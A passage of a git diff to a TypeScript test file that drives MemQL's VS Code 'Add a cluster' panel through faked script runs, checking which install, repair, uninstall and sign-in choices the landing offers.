@@ -1,45 +1,31 @@
-// The add-a-cluster page, driven the way an operator drives it (memql#3514).
+// The Add a cluster page, driven the way an operator drives it (memql#3514).
 //
-// WHY THIS FILE EXISTS. Nothing tested `AddClusterPanel`. That is not a
-// coverage statistic -- it is the specific gap that let four defects reach main
-// during epic #3463, each caught by reading code rather than by any test:
+// WHY THIS FILE EXISTS. Nothing tested `AddClusterPanel` until four defects
+// reached main, each satisfied by something ADJACENT to the requirement -- a
+// type existing, a state transition happening, a button rendering -- while the
+// thing the operator needed did not happen: Retry that re-ran nothing, a failed
+// run that claimed "Finished", a repair that could not pass wave 2, a step with
+// no timeout. The kit rewrite (memql#5118 audit) added its own list: a landing
+// that invented a verdict before detection ran, a password prompt whose
+// dismissal still started an uninstall, Retry dropped while other steps
+// finished, Cancel that said "Cancelled" while the cluster step kept working,
+// and a `make up` cluster the page offered to uninstall and then could not.
 //
-//   * Retry and Switch-to-Guided were inert. `state.retry()` put the failed
-//     step back to `pending` and the panel repainted; nothing re-ran. The
-//     operator fixed the cause, pressed Retry, and watched a screen that never
-//     changed again.
-//   * A failed run called `finish()`, moving to the `done` screen -- "Finished
-//     / Nothing further to do" -- taking the operator off the only screen
-//     carrying Retry.
-//   * A repair could not pass wave 2: with no `providerKeyFile` collected,
-//     `present()` dropped the flag and `verify-provider-key.sh` exited 2 on
-//     every invocation.
-//   * `timeoutMs` was never passed. The field existed in `SessionOptions`;
-//     `runner.ts` reads absent as NO timeout, so the omission removed the
-//     ceiling rather than choosing one.
+// WHAT IS REAL HERE, AND WHY IT MATTERS. The state machines are the real ones.
+// The graph is the SHIPPED `scripts/install/graph/install.json`. The plan, the
+// executor, the receipt and the params each step is handed are all real. The
+// ONLY fake is script EXECUTION: `RunScript`, injected through
+// `AddClusterDeps.runScript` -- and the harness injects one ALWAYS, because the
+// page asks detect.sh whether this computer is supported before it offers
+// Install, and a unit lane must never run a capability script for real.
 //
-// The shape is the same every time: each was satisfied by something ADJACENT
-// to the requirement -- a type existing, a state transition happening, a button
-// rendering -- while the thing the operator needed did not happen. A unit test
-// confirms the adjacent fact and passes. `beginRun()` returning `true` says
-// nothing about whether the run it started can complete.
-//
-// WHAT IS REAL HERE, AND WHY IT MATTERS. The state machine is the real
-// `AddClusterState`. The graph is the SHIPPED `scripts/install/graph/install.json`
-// -- so the wave-2 provider-key gate under test is the one operators run, not a
-// fixture that agrees with the test. The plan, the executor, the receipt and
-// the params each step is handed are all real. The ONLY fake is script
-// EXECUTION: `RunScript`, the seam `installExecutor.test.ts` already uses,
-// injected through `AddClusterDeps.runScript`. A fake any further up would be
-// the test file talking to itself.
-//
-// WHAT IS MODELLED BY HAND. The page's own click handler, and nothing else.
-// A card is a `<button data-choose=...>` inside the webview's iframe; there is
-// a host-to-webview post API but the click direction lives only in the page's
-// script, and nothing host-side can dispatch a DOM event into it (established
-// in memql#3478, stated in test-host/index.ts). So the EDH lane can prove the
-// command opens one panel with the right viewType and cannot press anything --
-// which is exactly why this file exists at this layer.
+// WHAT IS MODELLED BY HAND. The page's own script, and nothing else: a click
+// on the page posts `{ type: data-act, value: data-value }`, a keystroke posts
+// `{ type: "input", field, value }` and a switch posts `{ type: <switch-act>,
+// id, checked, value }` (src/webview/ui/runtime.ts). `panel.send` plays those.
+// The page never says `ready` here unless a case does, so every render is a
+// new document and `html` is the whole page -- except where a case sends
+// `ready` to watch what travels as a message instead.
 
 import test from "node:test";
 import assert from "node:assert/strict";
@@ -49,7 +35,8 @@ import * as path from "node:path";
 
 import type { ExtensionContext } from "vscode";
 
-import { ClusterPresence, type AddClusterAction } from "../src/clusters/presence.js";
+import { ClusterPresence, type AddClusterAction, type PresenceOptions } from "../src/clusters/presence.js";
+import type { Receipt } from "../src/install/receipt.js";
 import { graphDocumentPath, loadGraphFile, type Verify } from "../src/install/graph.js";
 import type { ScriptOutcome, ScriptRun } from "../src/install/runner.js";
 import {
@@ -58,33 +45,23 @@ import {
   type DestructiveConfirmation,
 } from "../src/webview/addClusterPanel.js";
 import {
-  Uri,
   recorded,
   resetRecorded,
-  setNextOpenDialogResult,
+  setNextInputBoxResult,
+  setNextWarningMessageChoice,
   type StubWebviewPanel,
 } from "./support/vscodeStub.js";
+import { LocalRuns } from "../src/deploy/localRun.js";
 
 // dist-test/test -> dist-test -> editors/vscode -> editors -> the repository.
-// The same walk installGraph.test.ts makes, and for the same reason: the graph
-// documents and the capability scripts live at the root, outside this package.
 const REPO_ROOT = path.resolve(__dirname, "..", "..", "..", "..");
 
 // A home of our own. The panel writes a receipt and a clusters.yaml on a
-// successful run, and a test has no business touching the developer's real
-// ~/.memql.
+// successful run, and a test has no business touching the developer's ~/.memql.
 const HOME = fs.mkdtempSync(path.join(os.tmpdir(), "memql-addcluster-panel-"));
 
-// A REAL FILE, because the panel now checks that the key path resolves to one
-// before it starts a run (memql#3544). "/tmp/key" was fine while nothing
-// looked; a fixture that names a file which does not exist is no longer a
-// fixture for the happy path.
-// A PATH AND NOTHING ELSE (epic memql#5088). It used to be a real file holding
-// an `sk-ant-` fixture, because the panel STATTED the key path before starting
-// a run (`keyFileProblem`). That check is gone with the field, so nothing reads
-// this and no file is written -- a credential-shaped literal on disk is what
-// secret scanners judge like production. What is left is the value a
-// pre-memql#5088 receipt recorded, which the case below asserts is never used.
+// A PATH AND NOTHING ELSE (epic memql#5088): the value a pre-memql#5088
+// receipt recorded, which the case below asserts is never used.
 const STALE_KEY_PATH = path.join(HOME, "provider-key");
 
 // -----------------------------------------------------------------------------
@@ -94,11 +71,6 @@ const STALE_KEY_PATH = path.join(HOME, "provider-key");
 /**
  * The envelope a step's OWN verify predicate asks for, derived from the shipped
  * graph rather than restated.
- *
- * Deriving it is the point. A hand-written envelope per capability would be a
- * second opinion about what each step proves, and it would keep passing after
- * the graph changed what it checks -- which is precisely the failure mode this
- * file exists to catch one layer up.
  */
 function satisfying(verify: Verify): Record<string, unknown> {
   const field = (verify.field ?? "").replace(/^result\./, "");
@@ -129,30 +101,21 @@ interface FakeRunner {
 /**
  * A script runner that does what each step's verify asks -- unless told not to.
  *
- * `failing` is keyed by CAPABILITY, and the failure it produces is the shape
- * `executor.ts` actually turns into a failed outcome: a well-formed envelope
- * whose result does not satisfy the verify. That is the normal failure shape
- * for this installer (every step verifies a `result.*` field), so a case that
- * fails a step is exercising the path a real failure takes.
+ * Keyed by CAPABILITY; the failure it produces is the normal failure shape for
+ * this installer: a well-formed envelope whose result does not satisfy the
+ * verify. It covers the install graph AND the uninstall graph, so one runner
+ * drives either run.
  */
 async function fakeRunner(
   failing: Record<string, number> = {},
-  /**
-   * Extra result fields per capability, merged over what the verify asks for.
-   *
-   * `satisfying()` derives only the ONE field a step's verify names, which is
-   * right for proving a step passed and not enough for a step whose result the
-   * wizard then READS. `enrolmentLink` verifies `result.enrolmentState` and
-   * carries the link on `result.enrolUrl`, so without this the happy path
-   * produces a step that passed and no link -- and a test asserting the link
-   * reaches the screen would be asserting against a fixture that cannot
-   * produce one.
-   */
+  /** Extra result fields per capability, merged over what the verify asks for. */
   extraResults: Record<string, Record<string, unknown>> = {},
 ): Promise<FakeRunner> {
-  const graph = await loadGraphFile(graphDocumentPath("install", REPO_ROOT));
   const verifyFor = new Map<string, Verify>();
-  for (const step of graph.steps) verifyFor.set(step.script, step.verify);
+  for (const kind of ["install", "uninstall"] as const) {
+    const graph = await loadGraphFile(graphDocumentPath(kind, REPO_ROOT));
+    for (const step of graph.steps) if (!verifyFor.has(step.script)) verifyFor.set(step.script, step.verify);
+  }
 
   const fake: FakeRunner = {
     calls: [],
@@ -164,6 +127,11 @@ async function fakeRunner(
       assert.ok(verify !== undefined, `the fake runner was asked for unknown capability ${capability}`);
       const exitCode = fake.failing.get(capability);
       const ok = exitCode === undefined;
+      // An uninstall removal reports the kind it was asked to remove.
+      const kind = run.params["kind"];
+      const result = ok
+        ? { ...satisfying(verify), ...(kind === undefined ? {} : { kind }), ...(extraResults[capability] ?? {}) }
+        : { ...(extraResults[capability] ?? {}) };
       return {
         argv: [run.scriptPath],
         exitCode: ok ? 0 : exitCode,
@@ -174,10 +142,7 @@ async function fakeRunner(
           ok,
           capability,
           changed: ok,
-          // A failed step's result does NOT satisfy its verify -- which is what
-          // makes it failed. `{}` has no field at all, so evaluateVerify
-          // returns false for every kind.
-          result: ok ? { ...satisfying(verify), ...(extraResults[capability] ?? {}) } : {},
+          result,
           error: ok ? null : { code: exitCode, message: `the fake refused ${capability}` },
         },
       };
@@ -198,6 +163,7 @@ interface Harness {
   panel: StubWebviewPanel;
   receiptFile: string;
   clustersPath: string;
+  runner: FakeRunner;
   close(): void;
 }
 
@@ -205,221 +171,517 @@ function context(): ExtensionContext {
   return { subscriptions: [] } as unknown as ExtensionContext;
 }
 
+type Verdict = "absent" | "installed-healthy" | "installed-unreachable" | "present-unreceipted";
+
+/** A receipt with one executed artifact, which is what presence counts as an install. */
+const INSTALLED_RECEIPT = {
+  version: 1,
+  graph: "install",
+  startedAt: "",
+  updatedAt: "",
+  entries: [
+    {
+      stepId: "toolK3d",
+      script: "install/tool.sh",
+      receipt: "binary",
+      preExisting: false,
+      params: {},
+      result: {},
+      changed: true,
+      recordedAt: "",
+    },
+  ],
+};
+
 /**
- * A presence probe that answers without touching the network or the operator's
- * files: the real `ClusterPresence`, over injected readers.
+ * A presence probe that answers without the network or the operator's files:
+ * the real `ClusterPresence`, over injected readers.
  */
 function presenceFor(
-  verdict: "absent" | "installed-healthy" | "installed-unreachable",
+  verdict: Verdict,
+  opts: { registered?: boolean; overrides?: Partial<PresenceOptions> } = {},
 ): ClusterPresence {
+  const registered = opts.registered ?? false;
   return new ClusterPresence({
     clustersPath: path.join(HOME, "clusters.yaml"),
     receiptPath: path.join(HOME, "no-such-receipt.json"),
-    // The entry carries a non-empty `receipt` because that is what
-    // `receiptEvidence` counts (memql#3544): an ARTIFACT, not an entry, so a
-    // failed run that recorded only its read-only steps is not read as an
-    // installed cluster. An empty entry list produced `absent` whatever this
-    // parameter said, which made the label here aspirational.
     readReceiptFile: async () =>
-      verdict === "absent"
-        ? null
-        : {
-            version: 1,
-            graph: "install",
-            startedAt: "",
-            updatedAt: "",
-            entries: [
-              {
-                stepId: "toolK3d",
-                script: "install/tool.sh",
-                receipt: "binary",
-                preExisting: false,
-                params: {},
-                result: {},
-                changed: true,
-                recordedAt: "",
-              },
-            ],
-          },
-    readClusters: async () => ({ ok: true as const, file: { selectedCluster: "", clusters: [] } }),
-    // Evidence WITHOUT an answer is `installed-unreachable`; evidence WITH one
-    // is `installed-healthy`. Both are "something is here", which is what the
-    // repair, uninstall and reconnect cards hang off.
+      verdict === "absent" || verdict === "present-unreceipted" ? null : (INSTALLED_RECEIPT as unknown as Receipt),
+    readClusters: async () => ({
+      ok: true as const,
+      file: {
+        selectedCluster: "",
+        clusters: registered ? [{ name: "memql", endpoint: "api.memql.localhost:443", domain: "memql.localhost", local: true }] : [],
+      },
+    }),
     probe: async () => verdict === "installed-healthy",
+    listClusters: async () => (verdict === "present-unreceipted" ? ["memql"] : []),
+    ...(opts.overrides ?? {}),
   });
 }
 
-function open(options: {
+/**
+ * Presence over the case's OWN receipt and clusters.yaml, which the panel's
+ * runs write: what the page finds when it looks again after a run.
+ */
+function livePresence(): { presence: ClusterPresence; bind: (h: Harness) => void } {
+  let receiptFile = "";
+  let clustersPath = "";
+  const presence = new ClusterPresence({
+    clustersPath: path.join(HOME, "unused.yaml"),
+    readReceiptFile: async () => {
+      try {
+        return JSON.parse(fs.readFileSync(receiptFile, "utf8")) as Receipt;
+      } catch {
+        return null;
+      }
+    },
+    readClusters: async () => {
+      const yaml = clustersPath !== "" && fs.existsSync(clustersPath) ? fs.readFileSync(clustersPath, "utf8") : "";
+      return {
+        ok: true as const,
+        file: {
+          selectedCluster: "",
+          clusters: /local: true/.test(yaml) ? [{ name: "memql", endpoint: "api.memql.localhost:443", local: true }] : [],
+        },
+      };
+    },
+    probe: async () => true,
+  });
+  return {
+    presence,
+    bind: (h) => {
+      receiptFile = h.receiptFile;
+      clustersPath = h.clustersPath;
+    },
+  };
+}
+
+interface OpenOptions {
   action?: AddClusterAction;
   runner?: FakeRunner;
-  verdict?: "absent" | "installed-healthy" | "installed-unreachable";
-  /** Seeded before the panel opens, for the repair cases. */
+  verdict?: Verdict;
+  registered?: boolean;
+  presence?: ClusterPresence;
+  /** Seeded before the panel opens, for the repair and uninstall cases. */
   receipt?: unknown;
-  /**
-   * Answers the modal the panel puts in front of a destructive Back
-   * (memql#4615). Absent means the case never reaches one -- and if it does,
-   * the panel's own default would try to draw a real modal, so leaving it out
-   * is how a case that wanders into the prompt fails loudly.
-   */
+  /** Seeded clusters.yaml, for the cases that read it back. */
+  clustersYaml?: string;
   confirmDestructive?: (prompt: DestructiveConfirmation) => Promise<boolean>;
-  /**
-   * Whether sudo runs without asking. Injected so a case that starts a run does
-   * not spawn the real thing -- see AddClusterDeps.sudoIsFree, which says why
-   * that seam is a safety rail as much as a seam.
-   */
+  /** Defaults to "sudo runs without asking": no case may spawn the real sudo. */
   sudoIsFree?: () => Promise<boolean>;
-}): Harness {
+  listLocalClusters?: () => Promise<string[]>;
+  isSignedIn?: (name: string) => boolean;
+  removeRegistryEntry?: (name: string) => Promise<unknown>;
+  probeCluster?: AddClusterDeps["probeCluster"];
+  runs?: LocalRuns;
+}
+
+async function open(options: OpenOptions = {}): Promise<Harness> {
   resetRecorded();
   const dir = fs.mkdtempSync(path.join(HOME, "case-"));
   const receiptFile = path.join(dir, "install-receipt.json");
   const clustersPath = path.join(dir, "clusters.yaml");
-  if (options.receipt !== undefined) {
-    fs.writeFileSync(receiptFile, JSON.stringify(options.receipt));
-  }
+  if (options.receipt !== undefined) fs.writeFileSync(receiptFile, JSON.stringify(options.receipt));
+  if (options.clustersYaml !== undefined) fs.writeFileSync(clustersPath, options.clustersYaml);
+  // ALWAYS a runner: the landing asks detect.sh about the platform.
+  const runner = options.runner ?? (await fakeRunner());
 
   const deps: AddClusterDeps = {
     diagnostics: { appendLine: () => {} },
     clustersPath,
     receiptFile,
     installRoot: REPO_ROOT,
-    // Every run now writes a record (memql#3739), and it defaults to
-    // ~/.memql/runs -- so without this the unit lane deposits a file in the
-    // developer's own run log, and in CI's, once per case that starts a run.
+    // Every run writes a record (memql#3739); keep it out of the real ~/.memql/runs.
     runsDir: path.join(dir, "runs"),
     refreshTree: () => undefined,
-    removeRegistryEntry: async () => undefined,
-    ...(options.runner ? { runScript: options.runner.run } : {}),
+    removeRegistryEntry: options.removeRegistryEntry ?? (async () => undefined),
+    runScript: runner.run,
+    sudoIsFree: options.sudoIsFree ?? (async () => true),
+    sudoAccepts: async () => true,
     ...(options.confirmDestructive ? { confirmDestructive: options.confirmDestructive } : {}),
-    ...(options.sudoIsFree ? { sudoIsFree: options.sudoIsFree } : {}),
+    ...(options.listLocalClusters ? { listLocalClusters: options.listLocalClusters } : {}),
+    ...(options.isSignedIn ? { isSignedIn: options.isSignedIn } : {}),
+    // Never the real https probe: a unit lane does not dial out.
+    probeCluster: options.probeCluster ?? (async () => ({ ok: false, reason: "no network in this lane" })),
+    // A slot of its own per case, unless the case shares one on purpose: a run
+    // an earlier case left going must not refuse this one.
+    runs: options.runs ?? new LocalRuns(),
   };
 
   AddClusterPanel.show(
     context(),
-    presenceFor(options.verdict ?? "absent"),
+    options.presence ?? presenceFor(options.verdict ?? "absent", { registered: options.registered ?? false }),
     deps,
     options.action,
   );
   const panel = recorded.webviews[recorded.webviews.length - 1]!;
-
   return {
     panel,
     receiptFile,
     clustersPath,
-    html: () => panel.html,
+    runner,
+    // Apostrophes and quotes as a reader sees them, so "Couldn't" matches.
+    html: () => decode(panel.html),
     post: (message: unknown) => panel.send(message),
     close: () => panel.close(),
   };
 }
 
-/** Fills the collect form the way typing into it does, then starts the run. */
+function decode(html: string): string {
+  return html.replace(/&#39;/g, "'").replace(/&quot;/g, '"');
+}
+
+/**
+ * Whether the page shows `re`: in the document, or -- once the page has said
+ * `ready` and the panel patches instead of re-assigning -- in a region it
+ * posted since.
+ */
+function shows(h: Harness, re: RegExp): boolean {
+  if (re.test(h.html())) return true;
+  return h.panel.posted.some((m) => {
+    const regions = (m as { type?: string; regions?: Record<string, string> }).regions;
+    return (m as { type?: string }).type === "patch" && regions !== undefined && Object.values(regions).some((r) => re.test(decode(r)));
+  });
+}
+
+/** How many primary buttons the page's action bar carries. */
+function primaries(html: string): number {
+  return html.split('data-tone="primary" data-act=').length - 1;
+}
+
+/** A keystroke, as the page posts it. */
+function type(h: Harness, field: string, value: string): void {
+  h.post({ type: "input", field, value });
+}
+
+/** Fills the install form the way typing into it does, then presses Install. */
 function beginInstall(h: Harness): void {
   h.post({ type: "choose", value: "install" });
-  h.post({ type: "input", value: { field: "domain", text: "memql.localhost" } });
-  h.post({ type: "input", value: { field: "ownerFirstName", text: "Ada" } });
-  h.post({ type: "input", value: { field: "ownerLastName", text: "Lovelace" } });
-  h.post({ type: "input", value: { field: "ownerEmail", text: "ada@example.com" } });
+  type(h, "domain", "memql.localhost");
+  type(h, "ownerFirstName", "Ada");
+  type(h, "ownerLastName", "Lovelace");
+  type(h, "ownerEmail", "ada@example.com");
   h.post({ type: "begin" });
 }
 
 /**
- * Waits for a condition the run reaches asynchronously.
- *
- * The panel's message handler is synchronous and starts the run with `void`, so
- * there is no promise to await. A bounded poll is what a caller has, and the
- * bound is what turns "this hangs" into a named failure.
+ * Waits for a condition the page reaches asynchronously. The message handler
+ * is synchronous and starts work with `void`, so a bounded poll is what a
+ * caller has, and the bound turns "this hangs" into a named failure.
  */
 async function until(condition: () => boolean, what: string): Promise<void> {
-  for (let i = 0; i < 2_000; i += 1) {
+  for (let i = 0; i < 3_000; i += 1) {
     if (condition()) return;
     await new Promise((resolve) => setTimeout(resolve, 1));
   }
   throw new Error(`timed out waiting for ${what}`);
 }
 
+const INSTALLED = /MemQL is installed/;
+
+/** Wraps a runner so ONE capability blocks until the case lets it go. Install before open(). */
+function gateOn(runner: FakeRunner, capability: string): { reached: () => boolean; release: () => void } {
+  let release = (): void => {};
+  const held = new Promise<void>((resolve) => {
+    release = resolve;
+  });
+  let reached = false;
+  const inner = runner.run;
+  runner.run = async (run) => {
+    if (run.capability === capability) {
+      reached = true;
+      await held;
+    }
+    return inner(run);
+  };
+  return { reached: () => reached, release };
+}
+
+/** The acts on the page's action bar, in order. */
+function barActs(html: string): string[] {
+  const bar = html.slice(html.indexOf('<div class="mq-actbar"'));
+  return [...bar.matchAll(/data-act="([^"]+)"/g)].map((m) => m[1]!);
+}
+
+/** The progress messages the panel posted, newest last. */
+function progressPosts(h: Harness): Array<Record<string, unknown>> {
+  return h.panel.posted.filter((m) => (m as { type?: unknown }).type === "progress") as Array<Record<string, unknown>>;
+}
+
 // -----------------------------------------------------------------------------
-// A repair with no recorded key RUNS -- it does not refuse, and it calls no
-// vendor (epic memql#4440, reversing the memql#3544 refusal on purpose)
+// the landing: never a guess, and only what applies
 // -----------------------------------------------------------------------------
 
-test("a repair with no recorded provider key runs, and contacts no vendor", async () => {
-  // THIS TEST USED TO ASSERT THE OPPOSITE, and the inversion is the whole
-  // point of the epic rather than an oversight.
-  //
-  // The refusal it guarded ("MemQL has no record of an AI provider key for
-  // this machine. Install rather than repair...") was the honest sentence for
-  // a graph in which every mutating step waited on a vendor call: without a
-  // key path the run could not pass wave 2, so refusing up front beat dying
-  // at exit 2 nine minutes in.
-  //
-  // After memql#4440 an install supplies no key in the ordinary case, so
-  // "no record of an AI provider key" became true of nearly every cluster --
-  // and the remedy it named, REINSTALLING, is destructive advice for a machine
-  // whose only problem was that repair declined to run. `providerKey` now
-  // skips, satisfied, so the repair simply proceeds.
-  const runner = await fakeRunner();
-  const h = open({ action: "repair", runner, verdict: "installed-unreachable" });
+test("the first paint is the shape of the list, never a verdict detection has not reached", async () => {
+  // THE DEFECT: the page's defaults were `installed-unreachable` and
+  // registered, so before detection ran it said "installed, but not
+  // answering" and offered Repair and Uninstall -- on machines with nothing
+  // installed.
+  let answer = (): void => {};
+  const held = new Promise<void>((resolve) => {
+    answer = resolve;
+  });
+  const presence = presenceFor("absent", {
+    overrides: {
+      readReceiptFile: async () => {
+        await held;
+        return null;
+      },
+    },
+  });
+  const h = await open({ presence });
   try {
-    // The owner fields still have to be supplied -- there is no receipt here,
-    // and `seedBootstrap` genuinely refuses a partial bootstrap set
-    // (znasllc-io#3888). That requirement is untouched by this epic; what
-    // changed is that the key path is no longer beside them.
-    h.post({ type: "input", value: { field: "ownerFirstName", text: "Ada" } });
-    h.post({ type: "input", value: { field: "ownerLastName", text: "Lovelace" } });
-    h.post({ type: "input", value: { field: "ownerEmail", text: "ada@example.com" } });
-    h.post({ type: "begin" });
+    const first = h.html();
+    assert.match(first, /class="mq-skeleton"/, "loading is the shape of the content");
+    assert.doesNotMatch(first, /not responding|not answering|Repair|Uninstall|Install MemQL/);
+    assert.deepEqual(barActs(first), [], "no act before there is a verdict");
+    answer();
+    await until(() => /Install MemQL on this computer/.test(h.html()), "the verdict");
+  } finally {
+    answer();
+    h.close();
+  }
+});
 
-    await until(() => runner.calls.length > 0, "the graph to be entered");
-
-    // THE ASSERTION THAT MATTERS, and it is now two-sided.
-    assert.ok(
-      !/provider key file is required/i.test(h.html()),
-      "the repair still refuses over a key it does not need",
-    );
-    assert.ok(
-      !/no record of an AI provider key/i.test(h.html()),
-      "the repair still tells the operator to reinstall a working cluster",
-    );
-    // VENDOR SILENCE, which is the guarantee this epic exists to make. Not
-    // "the run started" -- that a repair with no key contacts nobody.
-    assert.ok(
-      !runner.calls.some((c) => c.capability === "install.verifyProviderKey"),
-      "a keyless repair made an authenticated call to an AI vendor",
-    );
+test("nothing local: Install and Connect, and nothing else", async () => {
+  const h = await open({});
+  try {
+    await until(() => /Install MemQL on this computer/.test(h.html()), "the landing");
+    const html = h.html();
+    assert.match(html, /Connect to a cluster/);
+    assert.doesNotMatch(html, /data-value="(repair|uninstall|signIn|reconnect|adopt|installGuided)"/);
+    assert.match(html, /No local cluster/);
+    assert.equal(h.panel.title, "Add a cluster");
   } finally {
     h.close();
   }
 });
 
-// `a repair reads the key path back off the receipt and does reach wave 2` IS
-// REPLACED (epic memql#5088), by the case below asserting the inverse.
-//
-// It drove a repair over a receipt whose `providerKey` entry recorded a key
-// path and an OpenAI vendor, and asserted that both were pre-filled onto the
-// form and both reached `install.verifyProviderKey`. That mattered because
-// memql#3473's gate put the check in front of every mutating step, and
-// `session.ts` drops empty params -- so a repair that did not recover the path
-// died at exit 2 on every invocation (memql#3512).
-//
-// No receipt records either param now, and `verify-provider-key.sh` declares
-// neither flag. What has to be true instead is that an OLD receipt -- one
-// written by a version of the installer that did record them -- does not
-// resurrect either value.
+test("a local cluster that is installed and listed offers Sign in, Repair and Uninstall", async () => {
+  const h = await open({ verdict: "installed-healthy", registered: true });
+  try {
+    await until(() => /data-value="signIn"/.test(h.html()), "the landing");
+    const html = h.html();
+    assert.match(html, /data-value="repair"/);
+    assert.match(html, /data-value="uninstall"/);
+    assert.doesNotMatch(html, /data-value="install"/, "never an install over a cluster that is here");
+    assert.match(html, /Local cluster running/);
+  } finally {
+    h.close();
+  }
+});
+
+test("a choice the landing does not offer is refused, even when the page posts it", async () => {
+  // THE CHANNEL FROM THE PAGE IS UNTRUSTED, and two of these choices WRITE:
+  // reconnect and adopt put a list entry in clusters.yaml with no form in
+  // front of them. On a cluster that is already listed, neither is offered,
+  // and neither may happen -- nor may an Install over the cluster that is here.
+  const h = await open({ verdict: "installed-healthy", registered: true });
+  try {
+    await until(() => /data-value="signIn"/.test(h.html()), "the landing");
+    for (const value of ["reconnect", "adopt", "install", "installGuided", "nonsense"]) {
+      h.post({ type: "choose", value });
+    }
+    await new Promise((resolve) => setTimeout(resolve, 20));
+    assert.ok(!fs.existsSync(h.clustersPath), "a choice the landing did not offer wrote a list entry");
+    assert.ok(!recorded.executed.includes("memql.clusters.select"), "and selected it");
+    assert.doesNotMatch(h.html(), /data-act="begin"/, "an install form over a cluster that is here");
+    assert.match(h.html(), /data-value="signIn"/, "still the landing");
+  } finally {
+    h.close();
+  }
+});
+
+test("Sign in on the landing runs the one sign-in command, for the listed cluster", async () => {
+  const h = await open({
+    verdict: "installed-healthy",
+    registered: true,
+    clustersYaml: "clusters:\n  - name: memql\n    endpoint: api.memql.localhost:443\n    domain: memql.localhost\n    local: true\n",
+  });
+  try {
+    await until(() => /data-value="signIn"/.test(h.html()), "the landing");
+    h.post({ type: "choose", value: "signIn" });
+    await until(() => recorded.executed.includes("memql.clusters.signIn"), "the sign-in command");
+    const args = recorded.executedArgs[recorded.executed.indexOf("memql.clusters.signIn")]![0] as {
+      cluster: { name: string };
+    };
+    assert.equal(args.cluster.name, "memql");
+  } finally {
+    h.close();
+  }
+});
+
+test("signed in already, the landing offers MemQL OS instead of a second sign-in", async () => {
+  const h = await open({ verdict: "installed-healthy", registered: true, isSignedIn: (name) => name === "memql" });
+  try {
+    await until(() => /data-value="openOs"/.test(h.html()), "the landing");
+    assert.doesNotMatch(h.html(), /data-value="signIn"/);
+  } finally {
+    h.close();
+  }
+});
+
+test("a cluster make up built, listed by hand, offers no Repair: there is no install to replay", async () => {
+  const presence = presenceFor("installed-healthy", {
+    registered: true,
+    overrides: { readReceiptFile: async () => null },
+  });
+  const h = await open({ presence });
+  try {
+    await until(() => /data-value="signIn"/.test(h.html()), "the landing");
+    assert.doesNotMatch(h.html(), /data-value="repair"/);
+    assert.match(h.html(), /data-value="uninstall"/, "and it can still be uninstalled");
+  } finally {
+    h.close();
+  }
+});
+
+test("a local cluster that is here but not in the list offers Connect to it and Uninstall", async () => {
+  for (const verdict of ["installed-unreachable", "present-unreceipted"] as const) {
+    const h = await open({ verdict });
+    try {
+      await until(() => /Connect to it/.test(h.html()), `the landing for ${verdict}`);
+      const html = h.html();
+      assert.match(html, verdict === "present-unreceipted" ? /data-value="adopt"/ : /data-value="reconnect"/);
+      assert.match(html, /data-value="uninstall"/);
+      assert.doesNotMatch(html, /data-value="install"/);
+    } finally {
+      h.close();
+    }
+  }
+});
+
+test("an unsupported computer gets one sentence and Connect, and runs nothing but detect", async () => {
+  const runner = await fakeRunner();
+  const inner = runner.run;
+  const darwin = "unsupported platform darwin/amd64: the local cluster installer targets linux/amd64, darwin/arm64";
+  runner.run = async (run) => {
+    if (run.capability === "install.detect") {
+      runner.calls.push(run);
+      return {
+        argv: [run.scriptPath],
+        exitCode: 3,
+        signal: null,
+        stdout: "",
+        stderr: darwin,
+        envelope: {
+          ok: false,
+          capability: "install.detect",
+          changed: false,
+          result: { os: "darwin", arch: "amd64", supported: false },
+          error: { code: 3, message: darwin },
+        },
+      };
+    }
+    return inner(run);
+  };
+  // Opened by "Create Deployment", which names Install -- not offered here.
+  const h = await open({ runner, action: "install" });
+  try {
+    await until(() => /can't run a local MemQL cluster/.test(h.html()), "the landing");
+    const html = h.html();
+    assert.match(html, /data-value="connect"/);
+    assert.doesNotMatch(html, /data-value="install"|data-field="version"/, "no form for a run that cannot happen");
+    assert.equal(h.panel.title, "Add a cluster", "the tab says what the page is doing");
+    assert.ok(runner.calls.every((c) => c.capability === "install.detect"), "only detect may run");
+  } finally {
+    h.close();
+  }
+});
+
+test("Repair from a menu on a machine with nothing installed lands on the landing, not a form", async () => {
+  // THE DEFECT: `openOn` skipped the landing's rules, so Repair on an empty
+  // machine opened "Repair the local cluster" and ran a full install under
+  // repair wording.
+  const h = await open({ action: "repair" });
+  try {
+    await until(() => /Install MemQL on this computer/.test(h.html()), "the landing");
+    assert.doesNotMatch(h.html(), /data-act="begin"/);
+    assert.equal(h.panel.title, "Add a cluster");
+  } finally {
+    h.close();
+  }
+});
+
+test("Repair from a menu reaches the form for a broken install that dropped out of the list", async () => {
+  // Kept from before the redesign: an install that is not answering is
+  // repairable whether or not it is still in the list. The Deployments
+  // page's Repair opens this page on that branch, and must not dead-end.
+  const h = await open({ verdict: "installed-unreachable", registered: false, action: "repair" });
+  try {
+    await until(() => /data-act="begin"/.test(h.html()), "the repair form");
+    assert.equal(h.panel.title, "Repair MemQL");
+  } finally {
+    h.close();
+  }
+});
+
+test("a guided install is not offered, and a posted one does nothing", async () => {
+  // "Install guided" and "Switch this step to guided" set a flag nothing that
+  // runs a step ever read; the remedy's Run in terminal is the manual path.
+  const h = await open({});
+  try {
+    await until(() => /Install MemQL on this computer/.test(h.html()), "the landing");
+    assert.doesNotMatch(h.html(), /guided/i);
+    h.post({ type: "choose", value: "installGuided" });
+    await new Promise((resolve) => setTimeout(resolve, 10));
+    assert.doesNotMatch(h.html(), /data-act="begin"/, "a guided choice opened the form");
+  } finally {
+    h.close();
+  }
+});
+
+test("the verdict is looked at again on the way back, never kept from before", async () => {
+  // THE DEFECT: the verdict was read once, so after an install and Back the
+  // landing offered Install again. Presence here reads the case's REAL
+  // receipt and clusters.yaml, which the run writes.
+  const live = livePresence();
+  const h = await open({ presence: live.presence });
+  live.bind(h);
+  try {
+    beginInstall(h);
+    await until(() => INSTALLED.test(h.html()), "the install");
+    h.post({ type: "back" });
+    await until(() => /data-value="signIn"|data-value="openOs"/.test(h.html()), "the landing, looked at again");
+    assert.doesNotMatch(h.html(), /data-value="install"/, "Install offered over the cluster just built");
+  } finally {
+    h.close();
+  }
+});
+
+// -----------------------------------------------------------------------------
+// install: the run
+// -----------------------------------------------------------------------------
+
+test("a repair with no recorded provider key runs, and contacts no vendor", async () => {
+  // After memql#4440 an install supplies no key; `providerKey` skips,
+  // satisfied, so the repair simply proceeds.
+  const runner = await fakeRunner();
+  const h = await open({ action: "repair", runner, verdict: "installed-unreachable", registered: true });
+  try {
